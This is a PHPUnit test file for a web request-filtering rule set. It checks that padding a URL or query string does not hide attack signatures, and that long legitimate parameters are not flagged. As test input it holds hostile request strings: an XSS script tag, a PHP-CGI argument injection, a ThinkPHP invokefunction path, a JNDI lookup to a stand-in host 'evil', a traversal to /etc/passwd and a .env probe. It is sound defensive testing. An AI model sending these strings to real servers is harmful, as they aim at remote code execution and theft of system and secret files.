<?php

namespace Maximus\Fail2Ban\Tests\Feature\Rules;

use Maximus\Fail2Ban\Rules\Support\Subject;
use PHPUnit\Framework\Attributes\Test;

/**
 * 「垫长」不能成为绕过手段，也不能因此误伤长的正常参数。
 *
 * 以前先把整个查询串截到 4096 字节再拆参数，前面垫 4100 个字符，后面的攻击特征、
 * 已知漏洞的查询串条目（含 JNDI）就整段看不到了。路径也是同一个截断。
 */
class LongRequestTargetTest extends RuleTestCase
{
    private const XSS = 'q=%3Cscript%3Ealert(1)%3C/script%3E';

    #[Test]
    public function a_long_parameter_before_the_attack_does_not_hide_it(): void
    {
        $pad = str_repeat('a', 4100);

        $this->assertSame(['attack-pattern'], $this->hitIds($this->makeRequest('GET', '/ok?'.self::XSS), $this->response()));
        $this->assertSame(['attack-pattern'], $this->hitIds($this->makeRequest('GET', "/ok?pad={$pad}&".self::XSS), $this->response()));
        $this->assertSame(['attack-pattern'], $this->hitIds($this->makeRequest('GET', '/ok?pad='.str_repeat('a', 20000).'&'.self::XSS), $this->response()));
    }

    #[Test]
    public function padding_inside_the_same_parameter_does_not_hide_the_attack(): void
    {
        $pad = str_repeat('a', 6000);

        $this->assertSame(['attack-pattern'], $this->hitIds($this->makeRequest('GET', "/ok?q={$pad}%3Cscript%3Ealert(1)%3C/script%3E"), $this->response()));
        $this->assertSame(['attack-pattern'], $this->hitIds($this->makeRequest('GET', "/ok?q={$pad}%3Cscript%3Ealert(1)%3C/script%3E{$pad}"), $this->response()));
    }

    #[Test]
    public function many_small_parameters_before_the_attack_do_not_hide_it(): void
    {
        $many = implode('&', array_map(fn ($i) => "p{$i}=1", range(1, 1000)));

        $this->assertSame(['attack-pattern'], $this->hitIds($this->makeRequest('GET', "/ok?{$many}&".self::XSS), $this->response()));
    }

    #[Test]
    public function padding_does_not_hide_known_exploit_query_entries_or_jndi(): void
    {
        $pad = 'pad='.str_repeat('a', 4100);

        $this->assertContains('known-exploit', $this->hitIds($this->makeRequest('GET', "/?{$pad}&-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"), $this->response()));
        $this->assertContains('known-exploit', $this->hitIds($this->makeRequest('GET', "/index.php?{$pad}&s=/Index/\\think\\app/invokefunction"), $this->response()));
        $this->assertContains('known-exploit', $this->hitIds($this->makeRequest('GET', "/ok?{$pad}&x=%24%7Bjndi:ldap://evil/a%7D"), $this->response()));
    }

    #[Test]
    public function a_long_path_does_not_hide_its_suffix_or_a_traversal(): void
    {
        $long = '/'.str_repeat('a', 5000);

        $this->assertContains('sensitive-path', $this->hitIds($this->makeRequest('GET', $long.'.env'), $this->response(404)));
        $this->assertContains('attack-pattern', $this->hitIds($this->makeRequest('GET', $long.'/../../etc/passwd'), $this->response(404)));
    }

    #[Test]
    public function long_ordinary_parameters_are_not_hits(): void
    {
        $signature = rtrim(strtr(base64_encode(random_bytes(6000)), '+/', '-_'), '=');
        $callback = rawurlencode('https://merchant.example.com/notify?order=20261107'.str_repeat('0', 3000).'&sign=abc');
        $data = rawurlencode(json_encode(['items' => array_fill(0, 200, ['sku' => 'A-1', 'qty' => 1, 'name' => '商品'])], JSON_UNESCAPED_UNICODE));

        foreach ([
            "/api/pay?sign={$signature}",
            "/api/pay?notify_url={$callback}&sign={$signature}",
            "/api/pay?data={$data}",
            '/api/pay?'.implode('&', array_map(fn ($i) => "k{$i}=v{$i}", range(1, 1000))),
        ] as $uri) {
            $this->assertSame([], $this->hitIds($this->makeRequest('GET', $uri), $this->response()), substr($uri, 0, 80));
            $this->assertSame([], $this->hitIds($this->makeRequest('POST', $uri), $this->response()), substr($uri, 0, 80));
        }
    }

    #[Test]
    public function only_the_first_uri_max_bytes_are_inspected(): void
    {
        $this->assertGreaterThanOrEqual(32768, Subject::URI_MAX, '要覆盖 Cloudflare 允许的地址长度');

        // 超出 URI_MAX 的部分不看（这样长的地址过不了 Cloudflare 与 nginx 的默认设置）
        $beyond = '/ok?pad='.str_repeat('a', Subject::URI_MAX).'&'.self::XSS;
        $this->assertSame([], $this->hitIds($this->makeRequest('GET', $beyond), $this->response()));
    }
}
